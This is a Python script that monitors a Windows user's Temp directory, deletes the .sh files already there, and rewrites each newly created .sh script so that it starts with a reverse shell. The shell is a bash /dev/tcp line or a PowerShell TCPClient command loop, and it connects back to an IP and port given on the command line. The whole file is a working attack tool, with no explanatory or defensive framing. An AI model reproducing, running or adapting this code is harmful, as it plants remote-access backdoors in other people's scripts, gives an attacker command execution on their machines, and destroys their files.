import time
import argparse
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler


def delete_sh_files(directory_path):
    if not os.path.isdir(directory_path):
        print(f"Error: The path '{directory_path}' is not a valid directory.")
        return

    deleted_files = 0
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path) and filename.endswith('.sh'):
            try:
                os.remove(file_path)
                print(f"Deleted: {file_path}")
                deleted_files += 1
            except Exception as e:
                print(f"Error deleting {file_path}: {e}")

    if deleted_files == 0:
        print("No .sh files found to delete.")
    else:
        print(f"Total .sh files deleted: {deleted_files}")


class MyHandler(FileSystemEventHandler):
    def __init__(self, shared_list, ip, port):
        self.shared_list = shared_list
        self.ip = ip
        self.port = port

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.sh'):
            self.shared_list.append(event.src_path)
            print(f"New .sh file detected: {event.src_path}")
            self.modify_file(event.src_path)
            print("File modification completed.")

    def modify_file(self, file_path):
        try:
            with open(file_path, 'r', newline='\n') as file:
                lines = file.readlines()

            # Linux reverse shell
            commandL = f"bash -c 'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1 &# shellcheck shell=sh'\n"

            # Windows reverse shell (PowerShell)
            commandW = f"$powershell = [powershell]::Create().AddScript({{ $client = New-Object System.Net.Sockets.TCPClient('{self.ip}',{self.port}); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); $writer.AutoFlush = $true; while ($true) {{ $command = $reader.ReadLine(); if ($command -eq 'exit') {{ break }}; try {{ $result = Invoke-Expression $command 2>&1 | Out-String }} catch {{ $result = $_.Exception.Message }}; $writer.WriteLine($result); $writer.WriteLine('PS ' + (pwd).Path + '> ') }}; $client.Close() }}); $powershell.BeginInvoke() | Out-Null;\n"

            # OS detection (simple keyword-based)
            windows_keywords = ['windows', 'window', 'Windows']
            linux_keywords = ['linux', 'Linux']
            windows_found = False
            linux_found = False

            for line in lines:
                if any(keyword in line for keyword in windows_keywords):
                    windows_found = True
                    break
                if any(keyword in line for keyword in linux_keywords):
                    linux_found = True
                    break

            if windows_found:
                print("Windows keywords detected. Injecting PowerShell payload.")
                lines.insert(0, commandW)
            elif linux_found:
                print("Linux keywords detected. Injecting Bash payload.")
                lines.insert(0, commandL)
            else:
                print("No OS-specific keywords found. Injecting both payloads.")
                lines.insert(0, commandW)
                lines.insert(0, commandL)

            with open(file_path, 'w', newline='\n') as file:
                file.writelines(lines)

        except Exception as e:
            print(f"Error modifying file {file_path}: {e}")


def monitor_directory(path, sh_files, ip, port):
    event_handler = MyHandler(sh_files, ip, port)
    observer = Observer()
    observer.schedule(event_handler, path, recursive=False)
    print(f"Monitoring directory: {path}")
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
    print("Monitoring stopped.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Monitor directory for new .sh files and inject reverse shell payloads.")
    parser.add_argument("-i", "--listen-ip", required=True, help="IP address to connect back to")
    parser.add_argument("-p", "--listen-port", required=True, type=int, help="Port to connect back to")

    args = parser.parse_args()

    username = os.getlogin()
    temp_path = f"C:\\Users\\{username}\\AppData\\Local\\Temp"

    sh_files = []
    delete_sh_files(temp_path)
    monitor_directory(temp_path, sh_files, args.listen_ip, args.listen_port)
